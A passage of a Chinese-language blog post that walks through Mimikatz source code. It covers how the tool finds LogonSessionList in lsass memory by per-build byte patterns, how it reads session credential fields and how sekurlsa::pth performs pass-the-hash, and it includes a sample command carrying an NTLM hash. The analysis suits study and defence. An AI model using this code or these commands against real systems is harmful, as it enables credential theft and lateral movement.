class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">moduleInformation.NameDontUseOutsideCallback</span> = &amp;moduleName<span class="comment">;</span></div><div class="line"><span class="symbol">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrData; </span>aProcess.<span class="keyword">address </span>= Peb.<span class="keyword">Ldr;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrData)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">for(</div><div class="line">aLire  = (PBYTE) (<span class="keyword">LdrData.InMemoryOrderModulevector.Flink) </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks),</div><div class="line">fin    = (PBYTE) (Peb.<span class="keyword">Ldr) </span>+ FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector)<span class="comment">;</span></div><div class="line">(aLire != fin) &amp;&amp; continueCallback<span class="comment">;</span></div><div class="line">aLire  = (PBYTE) <span class="keyword">LdrEntry.InMemoryOrderLinks.Flink </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks)</div><div class="line">)</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrEntry; </span>aProcess.<span class="keyword">address </span>= aLire<span class="comment">;</span></div><div class="line"><span class="meta">if</span>(continueCallback = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrEntry)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">moduleInformation.DllBase.<span class="keyword">address </span>= <span class="keyword">LdrEntry.DllBase;</span></div><div class="line"><span class="keyword"></span>moduleInformation.SizeOfImage = <span class="keyword">LdrEntry.SizeOfImage;</span></div><div class="line"><span class="keyword"></span>moduleName = <span class="keyword">LdrEntry.BaseDllName;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(moduleName.<span class="keyword">Buffer </span>= (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= moduleName.<span class="keyword">Buffer; </span>aProcess.<span class="keyword">address </span>= <span class="keyword">LdrEntry.BaseDllName.Buffer;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation)<span class="comment">;</span></div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">LocalFree(moduleName.<span class="keyword">Buffer);</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList全局变量和LogonSessionListCount全局变量的地址,其中LsaSrvReferences数组存储着不同系统版本的索引特征码(位于kuhl_m_sekurlsa_utils.c文件中)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)</div><div class="line">&#123;</div><div class="line">PVOID *pLogonSessionListCount = (cLsass-&gt;osContext.BuildNumber &lt; KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &amp;LogonSessionListCount);</div><div class="line">return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &amp;LogonSessionList, pLogonSessionListCount, NULL, NULL);</div><div class="line">&#125;</div><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>此时LogonSessionListCount，LogonSessionList两个变量，仅仅表示的是其在内存中的地址。需要通过kull_m_memory_copy获取其值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="title">securityStruct</span>.hMemory = cLsass.hLsassMem;</div><div class="line"><span class="title">if</span>(securityStruct.address = <span class="type">LogonSessionListCount</span>)       </div><div class="line">kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">ULONG</span>));   //<span class="keyword">data</span>-&gt;address 保存的是<span class="type">LogonSessionListCount</span>的值</span></div><div class="line"><span class="title">for</span>(i = <span class="number">0</span>; i &lt; nbListes; i++)</div><div class="line">&#123;</div><div class="line">securityStruct.address = &amp;<span class="type">LogonSessionList</span>[i];</div><div class="line"><span class="class"><span class="keyword">data</span>.address = &amp;pStruct;</span></div><div class="line"><span class="class"><span class="keyword">data</span>.hMemory = &amp;<span class="type">KULL_M_MEMORY_GLOBAL_OWN_HANDLE</span>;</span></div><div class="line"><span class="keyword">if</span>(aBuffer.address = <span class="type">LocalAlloc</span>(<span class="type">LPTR</span>, helper-&gt;tailleStruct))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">PVOID</span>)))   //securityStruct.address 保存的是<span class="type">LogonSessionList</span>数组地址</span></div><div class="line"> .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后第三次调用kull_m_memory_copy()函数，获取双向链表的第一个节点,aBuffer.address就是第一个节点的地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;<span class="keyword">data</span>, helper-&gt;</span>tailleStruct))<span class="comment">//aBuffer.address指向的是LogonSessionList双向列表的某个节点</span></div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonId= (PLUID)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLuid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonType= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonType));</div><div class="line"><span class="function"><span class="title">sessionData</span>.Session= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToSession));</div><div class="line"><span class="function"><span class="title">sessionData</span>.UserName= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToUsername);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonDomain= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToDomain);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentials= *(PVOID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentials);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pSid= *(PSID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToPSid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentialManager);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonTime= *((PFILETIME)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonTime));</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonServer= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonServer);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure><p> <img src="http://hacky.wang/blog/20220215/7ozemelppDsx.png?imageslim" alt="mark"></p></li></ul><h2 id="Pass-the-Hash攻击-传递Hash攻击"><a href="#Pass-the-Hash攻击-传递Hash攻击" class="headerlink" title="Pass the Hash攻击(传递Hash攻击)"></a>Pass the Hash攻击(传递Hash攻击)</h2><ul><li><p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证(攻击者无须通过解密hash值来获取明文密码。)，以此来横向访问其他网络系统。 </p></li><li><p>在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存,凭据管理器(CredManage),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p></li><li><p>但是hash的获取是固定存在的，因为window中经常需要用hash来进行验证和交互。所以利用hash来进行横向移动在内网渗透中经常充当主力的角色。</p></li></ul><h2 id="sekurlsa-pth源码分析"><a href="#sekurlsa-pth源码分析" class="headerlink" title="sekurlsa::pth源码分析"></a>sekurlsa::pth源码分析</h2><ul><li>Mimikatz的sekurlsa::pth命令主要用户进行Pass The Hash攻击，其实现在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的kuhl_m_sekurlsa_pth函数。</li><li>命令如下：<code>sekurlsa::pth /user:Administrator /domain:192.168.230.129 /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></li><li><p>首先将分别解析命令行所传递的参数，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"luid"</span>, &amp;szLuid, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">tokenStats.AuthenticationId.HighPart = <span class="number">0</span>; <span class="comment">// because I never saw it != 0</span></div><div class="line">tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"user"</span>, &amp;szUser, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"domain"</span>, &amp;szDomain, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">isImpersonate = kull_m_string_args_byName(argc, argv, <span class="string">L"impersonate"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">kull_m_string_args_byName(argc, argv, <span class="string">L"run"</span>, &amp;szRun, isImpersonate ? _wpgmptr : <span class="string">L"cmd.exe"</span>);</div><div class="line">kprintf(<span class="string">L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n"</span>, szUser, szDomain, szRun, isImpersonate ? <span class="string">L"yes"</span> : <span class="string">L"no"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : domain\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : user\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>关于散列，一共可以有4种不同的类型可以选择，分别是aes128，aes256，ntlm，rc4。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, L<span class="string">"rc4"</span>, &amp;szNTLM, <span class="built_in">NULL</span>) || kull_m_string_args_byName(argc, argv, L<span class="string">"ntlm"</span>, &amp;szNTLM, <span class="built_in">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))</div><div class="line">&#123;</div><div class="line"><span class="built_in">data</span>.NtlmHash = ntlm;</div><div class="line">kprintf(L<span class="string">"NTLM\t: "</span>); kull_m_string_wprintf_hex(<span class="built_in">data</span>.NtlmHash, LM_NTLM_HASH_LENGTH, <span class="number">0</span>); kprintf(L<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"ntlm hash/rc4 key length must be 32 (16 bytes)\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>接着，调用kull_m_process_create()函数，kull_m_process_create()函数参数主要有</p><ul><li>szRun：需要运行的程序</li><li>szUser：用户名</li><li>szDomain：域</li><li>szPassword：密码(此处密码为空)<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(<span class="name">kull_m_process_create</span>(<span class="name">KULL_M_PROCESS_CREATE_LOGON</span>, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L<span class="string">""</span>, <span class="symbol">&amp;processInfos</span>, FALSE))</div></pre></td></tr></table></figure></li></ul></li><li><p>在kull_m_process_create()函数中，调用CreateProcessWithLogonW()创建一个进程。CreateProcessWithLogonW可以使用指定的凭证信息创建进程。但是传递的Password值是空的，以便后续填充。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">case</span> <span class="attr">KULL_M_PROCESS_CREATE_LOGON:</span></div><div class="line"><span class="string">status</span> <span class="string">=</span> <span class="string">CreateProcessWithLogonW(user,</span> <span class="string">domain,</span> <span class="string">password,</span> <span class="string">iLogonFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">dupCommandLine,</span> <span class="string">iProcessFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">&amp;startupInfo,</span> <span class="string">ptrProcessInfos);</span></div><div class="line"><span class="string">break;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure></li><li><p>接着调用kuhl_m_sekurlsa_pth_luid()函数，kuhl_m_sekurlsa_pth_luid()携带的参数是一个PSEKURLSA_PTH_DATA结构，其中包含6个成员。LogonId为登录的id，NtlmHash为NTLM散列，也就是常规Pth传入的值。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct _SEKURLSA_PTH_DATA &#123; </div><div class="line"><span class="type">PLUID</span><span class="type">LogonId</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">NtlmHash</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes256Key</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes128Key</span>;</div><div class="line"><span class="type">BOOL</span>isReplaceOk;</div><div class="line">&#125; <span class="type">SEKURLSA_PTH_DATA</span>, *<span class="type">PSEKURLSA_PTH_DATA</span>;</div></pre></td></tr></table></figure></li><li><p>kuhl_m_sekurlsa_pth_luid()首先会调用kuhl_m_sekurlsa_acquireLSA()，该函数首先会遍历Lsass.exe进程的模块，根据不同的sekurlsa模块不同的命令，选择不同的模块。例如msv命令就是寻找lsasvr.dll这个模块<br>  <img src="http://hacky.wang/blog/20220217/3PHnIpOeBOLI.png?imageslim" alt="mark"></p></li><li><p>kuhl_m_sekurlsa_acquireLSA()主要调用kull_m_process_getVeryBasicModuleInformations()函数通过PEB的Ldr列表获取指定模块的信息，主要是模块的基地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="keyword">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">for</span>(pLdrEntry  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr-&gt;</span>InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));</div><div class="line">(pLdrEntry != (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector))) &amp;&amp; continueCallback;</div><div class="line"><span class="function"><span class="title">pLdrEntry</span>  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (pLdrEntry-&gt;</span>InMemoryOrderLinks.Flink ) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))</div><div class="line">)</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.DllBase.address = pLdrEntry-&gt;</span>DllBase;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.SizeOfImage = pLdrEntry-&gt;</span>SizeOfImage;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.NameDontUseOutsideCallback = &amp;pLdrEntry-&gt;</span>BaseDllName;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation);</div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg);</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/CXUrtKPGnsJt.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList的特征码，LogonSessionList结构体包含了登录会话的诸多信息。其主要会调用kuhl_m_sekurlsa_utils_search_generic()函数。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>首先调用kull_m_patch_getGenericFromBuild()函数，其会根据系统版本选择指定的特征码。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword">&#123;</span></div><div class="line"><span class="keyword"></span>SIZE_T i<span class="comment">;</span></div><div class="line">PKULL_M_PATCH_GENERIC current = NULL<span class="comment">;</span></div><div class="line"></div><div class="line">for(i = <span class="number">0</span><span class="comment">; i &lt; cbGenerics; i++)</span></div><div class="line">&#123;</div><div class="line">if(generics[i].MinBuildNumber &lt;= <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword"></span>current = &amp;generics[i]<span class="comment">;</span></div><div class="line">else <span class="keyword">break;</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">return current<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_search搜索指定特征码的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(<span class="name">CurrentPtr</span> = (<span class="name">PBYTE</span>) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address<span class="comment">; !status &amp;&amp; (CurrentPtr + Length &lt;= limite); CurrentPtr++)</span></div><div class="line">status = RtlEqualMemory(<span class="name">Pattern-&gt;address</span>, CurrentPtr, Length)<span class="comment">;</span></div><div class="line">CurrentPtr--<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>调用lsassLocalHelper-&gt;AcquireKeys()函数，本质是调用kuhl_m_sekurlsa_nt6_acquireKeys()函数。其本质和kuhl_m_sekurlsa_utils_search_generic()函数一样，都是先调用kull_m_patch_getGenericFromBuild选择合适的特征码，然后搜索。其目的是为了寻找用于加密凭证的秘钥，因为凭证在内存中加密存储的。其实windows并不是直接比较里面的NTLM散列，而是比较经过加密之后的散列的密文。然后调用利用寻找到的秘钥调用BCryptGenerateSymmetricKey生成秘钥。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = &#123; <span class="comment">// InitializationVector, h3DesKey, hAesKey</span></div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">63</span>, <span class="number">-69</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">59</span>, <span class="number">-61</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),PTRN_WIN8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">62</span>, <span class="number">-70</span>, <span class="number">23</span>&#125;&#125;,</div><div 